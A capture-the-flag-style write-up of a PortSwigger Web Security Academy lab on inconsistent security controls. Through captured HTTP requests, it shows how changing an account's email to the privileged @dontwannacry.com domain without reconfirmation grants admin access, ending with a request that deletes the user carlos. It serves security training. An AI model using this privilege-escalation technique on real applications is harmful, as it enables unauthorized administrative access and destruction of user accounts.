# [Lab 5: Inconsistent security controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls)

---

## Description

This lab's flawed logic allows arbitrary users to access administrative functionality that should only be available to company employees. To solve the lab, access the admin panel and delete Carlos.

---

## Solution

### Application map
- Blog at `/`
- Login form at `/login`
- Account registration form at `/register`
- Admin panel at `/admin`

Administrative privileges are given to users with a `@dontwannacry.com` email address associated with their account.

### How does the application restrict access to `/admin`?

`GET` request for `/admin`:

```http
GET /admin HTTP/1.1
Host: ac7d1f0d1ec8ee3e80611d5f000b00f9.web-security-academy.net
Cookie: session=cSbepDgvduPqivzUi0muAfDxuD7i7xNq
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close
```

The application probably looks up the user associated with the `session` cookie to determine if their email is of the `@dontwannacry.com` domain.

If that's the case, then it seems like there are two options:
1. Register and confirm an account with an email address of the `@dontwannacry.com` domain
2. Somehow inject into the `session` cookie to get around the email address requirement
	- Since this challenge is more about business logic flaws than injection, I imagine that exploring #1 is the best course of action

### Account registration

Account registration `POST` request:

```http
POST /register HTTP/1.1
Host: ac7d1f0d1ec8ee3e80611d5f000b00f9.web-security-academy.net
Cookie: session=cSbepDgvduPqivzUi0muAfDxuD7i7xNq
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 146
Origin: https://ac7d1f0d1ec8ee3e80611d5f000b00f9.web-security-academy.net
Dnt: 1
Referer: https://ac7d1f0d1ec8ee3e80611d5f000b00f9.web-security-academy.net/register
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=uIGMzOWv6y4Wod7ptMUXpZIZp4xHlPNC&username=tgihf&email=tgihf%40exploit-ac8e1f081ec2eeea80f91d0d01a9009a.web-security-academy.net&password=blah
```

The application sends an email to `email` with a link. Clicking on the link generates this `GET` request:

```http
GET /register?temp-registration-token=0SOod5W404peUBGt9rJRxTRljqL9bv0e HTTP/1.1
Host: ac7d1f0d1ec8ee3e80611d5f000b00f9.web-security-academy.net
Cookie: session=cSbepDgvduPqivzUi0muAfDxuD7i7xNq
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Referer: https://exploit-ac8e1f081ec2eeea80f91d0d01a9009a.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close
```

The registration token appears to be random. The `session` cookie does not automatically authorize the user. The user must still go and log in.

Login request:

```http
POST /login HTTP/1.1
Host: ac7d1f0d1ec8ee3e80611d5f000b00f9.web-security-academy.net
Cookie: session=cSbepDgvduPqivzUi0muAfDxuD7i7xNq
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Origin: https://ac7d1f0d1ec8ee3e80611d5f000b00f9.web-security-academy.net
Dnt: 1
Referer: https://ac7d1f0d1ec8ee3e80611d5f000b00f9.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=uIGMzOWv6y4Wod7ptMUXpZIZp4xHlPNC&username=tgihf&password=blah
```

 The application gives an authenticated user the option to change their email address. Does this functionality generate another email confirmation, or simply accept the user input email address as good?
 
 Request to change email address:
 
 ```http
POST /my-account/change-email HTTP/1.1
Host: ac7d1f0d1ec8ee3e80611d5f000b00f9.web-security-academy.net
Cookie: session=UflXQsnscc17n5NfPLlyw67rIxwgHBQV
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://ac7d1f0d1ec8ee3e80611d5f000b00f9.web-security-academy.net
Dnt: 1
Referer: https://ac7d1f0d1ec8ee3e80611d5f000b00f9.web-security-academy.net/my-account?id=tgihf
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

email=tgihf%40dontwannacry.com&csrf=GfCzzsxTKBzu8c1m8QcPwtimoA4oPVOb
 ```
 
 Results in a redirect to `/my-account` which indicates the email address was changed successfully.
 
 ![](images/Pasted%20image%2020210827191329.png)
 
 Access the admin panel and delete `carlos`'s account to complete the challenge.
 
 ```http
 GET /admin/delete?username=carlos HTTP/1.1
Host: ac7d1f0d1ec8ee3e80611d5f000b00f9.web-security-academy.net
Cookie: session=UflXQsnscc17n5NfPLlyw67rIxwgHBQV
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Referer: https://ac7d1f0d1ec8ee3e80611d5f000b00f9.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close
 ```
 
 ![](images/Pasted%20image%2020210827191736.png)
 